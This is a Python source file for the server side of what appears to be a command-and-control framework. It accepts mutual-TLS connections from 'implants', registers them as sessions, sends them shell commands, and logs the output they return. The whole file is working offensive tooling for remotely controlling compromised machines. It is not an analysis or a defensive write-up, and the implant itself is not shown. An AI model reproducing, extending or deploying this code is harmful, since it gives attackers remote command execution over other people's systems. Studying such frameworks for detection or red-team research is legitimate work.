#!/usr/bin/env python3

import logging
import socket
import ssl
import threading
import urllib
import uuid
import sys
from certs.certs import cert_generator
from pb import implantpb_pb2
from queue import Queue
from typing import Tuple
import urllib.parse


# A thread safe dict of sessions and their ids
class Sessions:
    def __init__(self):
        self._mutex = threading.Lock()
        self._sessions = dict()

    # Add a connection and an address
    def add(self, conn, addr) -> str:
        # TODO: make sure the id doesn't already exist in the _sessions dict
        self._mutex.acquire()
        id = str(uuid.uuid4())
        self._sessions[id] = (conn, addr)
        self._mutex.release()
        return id

    # Get the connection by the session ID
    def get(self, id):
        self._mutex.acquire()
        conn, addr = self._sessions[id]
        self._mutex.release()
        return (conn, addr)

    # Return a list of session IDs
    def list(self) -> list:
        self._mutex.acquire()
        ids = list(self._sessions.keys())
        self._mutex.release()
        return ids


class Listener:
    def __init__(self, requestq: Queue, endpoint: str):
        self.host, self.port = self._parse_endpoint(endpoint)
        self.sessions = Sessions()
        # Automatically generate CA certificates for the server
        self.Server_Certificate_Generator = cert_generator('server', client=False) #This 'server' is the hostname for the cert
        self.server_cert, self.server_key = self.Server_Certificate_Generator.build_x509_cert()

        # Create an initial set of client certs
        #self.Client_Certificate_Generator = cert_generator('implant', client=True)
        #self.implant_cert, self. implant_key = self.Client_Certificate_Generator.build_x509_cert()

        ctx = self._mtls_cfg()
        self.ssock = self._mkssock(ctx)

        # start accepting connections
        t = threading.Thread(target=self._accept, args=(requestq,))
        t.start()

    def _parse_endpoint(self, endpoint: str) -> Tuple[str, int]:
        result = urllib.parse.urlsplit(f"//{endpoint}")
        if result.hostname is None:
            raise ValueError(f"Invalid hostname in endpoint {endpoint}")

        if result.port is None:
            raise ValueError(f"Invalid port in endpoint {endpoint}")

        return result.hostname, result.port

    def _mtls_cfg(self) -> ssl.SSLContext:
        # mTLS settings
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_cert_chain(certfile=self.server_cert, keyfile=self.server_key)
        ctx.load_verify_locations(cafile=self.Server_Certificate_Generator.CA_Path)
        return ctx

    # Create a secure socket
    def _mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.host, self.port))
            s.listen()
            return ctx.wrap_socket(s, server_side=True)

    # Accept connections from implants
    def _accept(self, requestq: Queue):
        while True:
            conn, addr = self.ssock.accept()
            print(f"Accepted connection from {addr}")
            # conn.verify_client_post_handshake()
            threading.Thread(target=self._handle_conn, args=(requestq, conn, addr)).start()

    def _handle_conn(self, requestq: Queue, conn: ssl.SSLSocket, addr):
        # Add the session
        id = self.sessions.add(conn, addr)
        print(f"implant ID: {id}")

        # Send the registration to the handler with session id
        data = conn.recv(2048)
        requestq.put((data, addr, id))

        # TODO: Authenticate the implant before sending a confirmation
        confirmation = implantpb_pb2.Message(
            message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
            data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
        ).SerializeToString()
        conn.sendall(confirmation)

        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
        logging.info(f"Accepted connection from {addr} | {id}")


# Send data to implant
def session(conn: ssl.SSLSocket, userin):
    # Turn the cmd into a protobuf Message
    os_cmd = implantpb_pb2.OsCmd(cmd=userin)
    message = implantpb_pb2.Message(
        message_type=implantpb_pb2.Message.MessageType.OsCmd,
        data=os_cmd.SerializeToString()
    )
    conn.sendall(message.SerializeToString())
    data = conn.recv(1024)

    if not data:
        return 

    else:
        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
        # Decode the data into OsCmdOutput
        message = implantpb_pb2.Message()
        message.ParseFromString(data)
        if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
            output = implantpb_pb2.OsCmdOutput()
            output.ParseFromString(message.data)
            logging.info(output.stdout)

            result = b""
            if output.HasField("status") and output.code != 0:
                result += f"Status code: {output.code}\n".encode()

            if len(output.stderr) > 0:
                result += b"stdout:\n" +output.stdout + b"\nstderr:\n" + output.stderr

            else:
                result += output.stdout

            return result
